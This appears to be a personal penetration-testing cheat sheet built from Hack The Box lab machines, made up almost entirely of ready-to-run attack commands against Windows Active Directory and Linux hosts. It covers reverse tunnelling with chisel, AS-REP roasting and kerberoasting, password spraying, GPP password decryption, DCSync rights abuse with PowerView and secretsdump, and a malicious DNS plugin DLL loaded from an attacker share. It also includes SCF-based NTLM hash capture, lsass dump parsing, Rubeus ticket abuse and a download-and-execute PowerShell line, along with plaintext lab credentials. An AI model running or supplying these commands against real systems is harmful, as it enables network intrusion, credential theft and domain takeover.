# Stablize Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'

ctrl+z

stty raw -echo;fg
```
# Port Scanning with NetCat

```bash
nc -zv <IP> 1-65535
```
# Chisel usage:
- On the local machine:
```bash
./chisel server -p 8000 --reverse
```
- On target host:
```bash
./chisel client <LHOST>:8000 R:socks
```

# Find SUID bit.
```bash
find / -perm -u=s -type f 2>/dev/null
```

# Using rpcclient options got user list:
```bash
└─$ rpcclient -U "" -N 10.10.10.100
rpcclient $> enumdomusers
```

# let's use the impacket tool- GetNPUsers.py to try getting a hash for each user.
```bash
┌──(singhx㉿kali)-[~]
└─$ for user in $(cat user.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
```

# Mounted smb shares:
```bash
└─$ sudo mount -o user=nouser -t cifs "//10.10.10.103/Department Shares" /mnt/

```
# Enumerating LDAP with windapsearch:
```bash
└─# ./windapsearch.py -d egotistical-bank.local --dc-ip 10.10.10.175 -U   
```

# Run GetADUsers.py:
```bash
└─# GetADUsers.py egotistical-bank.local/ -dc-ip 10.10.10.175 -debug
```

# Use SMB:
```bash
└─# smbclient -L ////10.10.10.175//
```

# The Group Policy password is in encrypted format let's decrypt it:
```bash
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

# By login to smbclient we got user.txt:
```bash
└─$ smbclient //10.10.10.100/Users -U svc_tgs
Password for [WORKGROUP\svc_tgs]:
```

# Using rpcclient got access to cmd and got all users:
```bash
└─$ rpcclient -U "svc_tgs" 10.10.10.100
Password for [WORKGROUP\svc_tgs]:
```

# Try to get info system using crackmapexec on smb:
```bash
└─$ crackmapexec smb 10.10.10.169 -u marco -p 'Welcome123!' --continue-on-success 
```

# Let's do password spray using crackmapexec:
```bash
└─$ crackmapexec smb 10.10.10.169 -u users -p Welcome123! --continue-on-success 
```
# Run SharpHound binary on Target with collection method all:
```bash
 .\SharpHound.exe -c All
 ```
 
 # CanPSRemote Abuse
 ```bash
net user boss boss123 /add /domain
net group "Exchange Windows Permissions" /add boss

> now upload powerview.ps1:
upload PowerView.ps1

> Type the cmds:
Import-Module ./PowerView.ps1
$SecPassword = ConvertTo-SecureString 'boss123' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('megabank\boss', $SecPassword)
Add-DomainObjectAcl -Credentials $Cred -TargetIdentity htb.local -PrincipalIdentity boss -Rights DCSync
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=megacorp,DC=local" -PrincipalIdentity boss -Rights DCSync

> now run secretsdump to collect the hashes:
└─$ secretsdump.py htb/boss:boss123@10.10.10.161
```

# Run PowerView.ps1 with the cmd for GenericWrite: 
```bash
PS C:\Users\sbauer\Documents> Import-Module ./PowerView.ps1
PS C:\Users\sbauer\Documents> Get-ADUser jorden | Set-ADAccountControl -doesnotrequirepreauth $true
```
# Run GetNPUsers.py to get tgt:
```bash
└─$ GetNPUsers.py -no-pass -dc-ip 10.10.10.179 megacorp/jorden 
[*] Getting TGT for jorden
$krb5asrep$23$jorden@MEGACORP:

```
# Got login using Evil-winrm:
```bash
└─$ evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
```

# Run cmd to get tgs of administrator:
```bash
└─$ GetUserSPNs.py -request active.htb/SVC_TGS -dc-ip 10.10.10.100
```

# Login using PSExec with credentials:
```bash
└─$ psexec.py administrator@10.10.10.100
```

# Parse the file using smbserver.py:
```bash
└─$ smbserver.py s ./
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
# Parse file using Python server
```bash
└─$ python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) 
```


# DNS Enum
```bash
PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.14.11\s\rev.dll

PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.14.2:8000\rev.dll

 nc -nvlp 4444    
 
 sc.exe stop dns
 
 sc.exe start dns
 ```
 
 
 # SQL File opening:
 ```bash
└─# sqlite3 Audit.db

OR

─# sqlitebrowser Audit.db  

```

# Getting bloodhound file using the bloodhound-python:
```bash
└─# bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -c DCOnly

```

# Open .DMP file using:
```bash
└─$ pypykatz lsa minidump memory_analysis/lsass.DMP  
```
     
     


# Kerbrute usernames:  
```bash
root@kali# kerbrute userenum --domain htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.52

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

```


# Using the exploit ms14-068 got vulnerability:
```bash
└─$ goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52 HTB.LOCAL/james:'J@m3s_P@ssW0rd!'@mantis.htb.local
```


# Found write permissions in smbclient: Users/Public and ZZ_Archieve folder Upload a .scf file for capturing NTLM hash using responder:
```bash
========make a file .scf==========
└─$ cat file.scf 
[Shell]
Command=2

IconFile=\\10.10.14.4\icon          
                          
> Setup responder to capture hash:   
└─# responder -I tun0          

> Upload file to the writeable folders
smb: \Users\Public\> put file.scf 
putting file file.scf as \Users\Public\file.scf (0.2 kb/s) (average 0.2 kb/s)


got hash captured... If not works restart the machine.
```


# Dumped LDAPdomain:
```bash
└─# ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103 -o /home/singhx/htb/sizzle/ldap
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

└─# ls /home/singhx/htb/sizzle/ldap

domain_computers_by_os.html  domain_computers.html  domain_groups.grep  domain_groups.json  domain_policy.html  domain_trusts.grep  domain_trusts.json          domain_users.grep  domain_users.json
domain_computers.grep        domain_computers.json  domain_groups.html  domain_policy.grep  domain_policy.json  domain_trusts.html  domain_users_by_group.html  domain_users.html
```
# ========View data Using FireFox============
```bash
└─$ firefox domain_users.html
```


 # Generated a new certificate:
 ```bash
 └─$ openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
 ```
 
 
 # Upload Rubeus.exe in c:\windows\system32\spool\drivers\color\ as it is out of constraint:
 ```bash
 
 IWR -o r.exe http://10.10.14.4:80/Rubeus.exe

 .\r.exe hash /password:Ashare1972

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : Ashare1972
[*]       rc4_hmac             : 7D0516EA4B6ED084F3FDF71C47D9BEB3


 .\r.exe asktgt /user:amanda /rc4:7D0516EA4B6ED084F3FDF71C47D9BEB3 /outfile:amanda-tgt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT


 .\r.exe asktgs /service:http/sizzle /ticket:amanda-tgt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGS


 .\r.exe kerberoast /spn:http/sizzle /ticket:amanda-tgt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Kerberoasting

```


# Upload and run privcheck.ps1:
```bash
PS C:\users\alcibiades\desktop> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.4/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended
```bash
